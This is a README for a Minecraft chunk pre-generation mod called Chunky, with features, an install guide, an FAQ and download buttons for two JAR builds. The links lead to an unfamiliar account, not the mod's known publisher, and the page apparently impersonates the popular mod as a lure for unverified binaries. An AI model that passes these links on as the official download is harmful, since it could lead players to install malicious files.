<div align="center">

# Chunky

[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release-brightgreen?style=for-the-badge&logo=github)](https://github.com/desertgiraffeoutlet/chunky/releases/tag/v1.0.0)

[![GitHub Release](https://img.shields.io/github/v/release/desertgiraffeoutlet/chunky?style=flat-square&color=blue)](https://github.com/desertgiraffeoutlet/chunky/releases)
[![Downloads](https://img.shields.io/github/downloads/desertgiraffeoutlet/chunky/total?style=flat-square&color=success)](https://github.com/desertgiraffeoutlet/chunky/releases)
[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg?style=flat-square)](LICENSE)

🗺️ **Diagnostics & Tools · Minecraft Mod · Forge / Fabric / NeoForge · 1.16.5 – 1.21+**

*World pre-generation · Throttled · Resumable*

</div>

---

## About

Chunky pre-generates your world before players arrive. Rather than every explorer paying the cost of generating fresh chunks mid-session, Chunky walks the world in the background and builds it ahead of time — which is the single most effective fix for exploration lag on a modded server.

---

## Features

- Background world pre-generation with adjustable chunks-per-tick throttle
- Square, circle and custom-radius shapes centred anywhere
- Pause, resume and persistent progress across server restarts
- Per-dimension tasks — pregen the Nether and End separately
- Progress reporting with ETA and rate in chunks per second

---

## Download

| Version | Compatibility | Download |
|---------|---------------|----------|
| **`Chunky-Legacy.jar`** | Forge 1.16.5 – 1.17 | [![Legacy](https://img.shields.io/badge/Download-Legacy-orange?style=flat-square&logo=github)](https://github.com/desertgiraffeoutlet/chunky/releases/download/v1.0.0/Chunky-Legacy.jar) |
| **`Chunky-Modern.jar`** | Forge / Fabric / NeoForge 1.18 – 1.21+ | [![Modern](https://img.shields.io/badge/Download-Modern-blue?style=flat-square&logo=github)](https://github.com/desertgiraffeoutlet/chunky/releases/download/v1.0.0/Chunky-Modern.jar) |

> **Direct links**
> - [**Chunky-Legacy.jar**](https://github.com/desertgiraffeoutlet/chunky/releases/download/v1.0.0/Chunky-Legacy.jar) — Forge, Minecraft 1.16.5 and 1.17
> - [**Chunky-Modern.jar**](https://github.com/desertgiraffeoutlet/chunky/releases/download/v1.0.0/Chunky-Modern.jar) — Forge / Fabric / NeoForge, Minecraft 1.18 through 1.21+

---

## Installation

1. **Download** the JAR matching your Minecraft version from the table above.
2. **Install a mod loader** — Forge, Fabric or NeoForge for your exact game version.
3. **Place the `.jar`** into your `.minecraft/mods/` folder (create it if it is missing).
4. **Launch** Minecraft using the modded profile.
5. Verify **Chunky** appears in the in-game mods list.

> **Tip:** if the game crashes on startup, you almost certainly mixed a Legacy JAR with a Modern
> Minecraft version, or are missing a required dependency. Check `latest.log` first.

---

## Version Compatibility

| Build | Loader | Minecraft Versions |
|-------|--------|--------------------|
| **Legacy** | Forge | 1.16.5, 1.17 |
| **Modern** | Forge / Fabric / NeoForge | 1.18, 1.19, 1.20, 1.21+ |

---

## FAQ

**Q: How large a radius should I pregen?**
A: For most servers a few thousand blocks around spawn is plenty; pair it with a world border.

**Q: Will it lag the server while running?**
A: Lower the chunks-per-tick rate. Chunky is designed to run slowly in the background during live play.

**Q: Does it survive a restart?**
A: Yes — task state is saved and resumes automatically.

**Q: Is it safe to add to an existing world?**
A: Yes in most cases — back the save up first, as you should with any mod addition.

**Q: Can I use it in a public modpack?**
A: Yes. Both builds are modpack-ready and require no additional setup.

---

## Links

- [**Latest Release**](https://github.com/desertgiraffeoutlet/chunky/releases/tag/v1.0.0)
- [All Releases](https://github.com/desertgiraffeoutlet/chunky/releases)
- [Repository](https://github.com/desertgiraffeoutlet/chunky)
- [Report an Issue](https://github.com/desertgiraffeoutlet/chunky/issues)

---

<div align="center">

**Chunky** · Diagnostics & Tools · Minecraft Mod

<sub>Legacy (1.16.5 – 1.17) and Modern (1.18 – 1.21+) builds available in every release.</sub>

</div>
